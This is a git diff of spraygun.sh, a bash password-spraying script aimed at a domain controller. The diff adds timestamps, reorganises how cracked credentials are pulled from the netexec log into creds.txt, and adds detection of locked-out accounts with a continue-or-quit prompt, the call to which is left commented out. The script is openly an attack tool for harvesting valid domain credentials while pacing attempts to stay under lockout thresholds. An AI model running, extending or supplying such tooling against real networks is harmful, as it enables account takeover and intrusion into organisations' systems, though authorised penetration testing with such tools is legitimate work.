@@ -21,20 +21,27 @@
 # $5 - passwords per
 
 
-#check for args
+##########################################
+#### checking for args
+##########################################
 if [ $# -ne 5 ]; then
 	echo 'Usage: spraygun.sh dc-ip users-list pass-list sleep-time-in-mins passwords-per-round'
 	echo 'Example: ./spraygun.sh 10.10.10.10 users.txt passwords.txt 35 2'
 	exit -1
 fi
 
-#pulling arg 4 into a var for timer() function
-sleeping=$4 
+
 
 
 #############################################
 # timer func is used to display seconds onto the screen; being used to countdown for spray for more accurate tracking.
 #############################################
+#used for sleeping the amount of time specified by user
+sleep_timer="sleep $4m" 
+
+#pulling arg 4 into a var for timer() function
+sleeping=$4 
+
 timer()
 {
 secs=$(($sleeping * 60))
@@ -45,10 +52,54 @@ while [ $secs -gt 0 ]; do
 done
 }
 
-#used for sleeping the amount of time specified by user
-sleep_timer="sleep $4m" 
 
-# making files for moving passwords around
+#############################################
+# locked out func used to fail safe too many account lock outs.
+#############################################
+locked_out() 
+{
+	
+if [[ $lockedout_count -gt 2 ]]; then
+	while true; do
+
+	echo ""
+	echo "Found locked out accounts."
+	echo " "
+	echo "Press c to continue spraying or q to quit"
+	echo ""
+
+	#read user input into var $key
+	read -s -n 1 key
+
+		case $key in
+				
+			[cC])
+				echo "Continuing"
+				echo ""
+				cat lockedout.users >> lockedout.users.bak
+				rm lockedout.users
+				break
+				;;
+			[qQ])
+				echo "Quitting"
+				exit 0
+				;;
+			*)
+				echo "select c or q"
+				;;
+		esac
+
+	done
+
+fi
+
+}
+
+
+##########################################
+#### Making files
+##########################################
+
 touch ./creds.txt 
 touch ./used-passwords.txt
 touch ./tmp-creds.txt
@@ -64,14 +115,19 @@ head -n $count $3 > passwords-in-queue.txt
 
 # while loop to loop through passwords file, twice per loop
 # going to try and add how many times per loop a user wants
-while [ $count -gt 0 ]; do
 
-	echo "Starting password spray with $5 passwords every $4 mins"
+##########################################
+#### Spray loop
+##########################################
+
+echo "Starting password spray with $5 passwords every $4 mins"
+while [ $count -gt 0 ]; do
 	
 	# parses top two passwords from tmp.txt and sprays with netexec ; logs to spraygun-log.log	
 	for pass in $(cat passwords-in-queue.txt | head -$5); do
 		echo ''
 		echo '############################'
+		date
 		echo "Spraying: $pass"
 		echo '############################'
 		echo ''
@@ -83,17 +139,48 @@ while [ $count -gt 0 ]; do
 
 	done
 	
+##########################################
+#### Creds
+##########################################
+
 	# prints creds found to screen and to tmp-creds.txt ; then sorts uniquely and puts into creds.txt
+	cat spraygun-log.log | grep -ai '[+]' | awk -F " " '{print $11}' >> tmp-creds.txt
+	sort -u tmp-creds.txt > creds.txt 
 	echo ''
 	echo '############################'
+	date
 	echo "Found creds: "
-	cat spraygun-log.log | grep -ai '[+]' | awk -F " " '{print $11}' | tee -a tmp-creds.txt
+	cat creds.txt
 	echo '############################'
- 	sort -u tmp-creds.txt > creds.txt 
 	echo "--Creds in creds.txt--"
 	echo ''
 	
+##########################################
+#### LOCKOUT
+##########################################
 	
+	cat spraygun-log.log | grep -ai 'LOCKED_OUT' | awk -F " " '{print $11}' | awk -F "\\" '{print $2}' | awk -F ":" '{print $1}' | sort -u > lockedout.users
+	# sed delete for lockedout.users cmp lockedout.users.bak
+	lockedout_count=$(wc -l < lockedout.users)
+	echo ''
+	echo ''
+	echo '*******************************'
+	date
+	echo "Account lockouts found : "
+	cat lockedout.users
+	if [ $lockedout_count -eq 0 ]; then
+		echo "none"
+	fi
+	echo '*******************************'
+	echo ''
+	echo ''
+	# locked_out
+	# function needs to be less strict on lockedout users
+
+	
+##########################################
+#### File edits to reset loop
+##########################################
 	#removes top to lines from tmp.txt so the loop can start at the top of tmp.txt with two new passwords
 	sed -i "1,$5d" passwords-in-queue.txt
 	
@@ -106,10 +193,14 @@ while [ $count -gt 0 ]; do
 		break
 	fi
 	
+##########################################
+#### Sleep & countdown
+##########################################
 	# sleep set up for time provided and countdown
 	echo "sleeping for $4 mins"
 	echo ''
 	echo "Time until next spray (seconds): " 
+	# sleep for specified minutes and fancy countdown timer func
 	$sleep_timer & timer
 	echo ''
 	echo ''
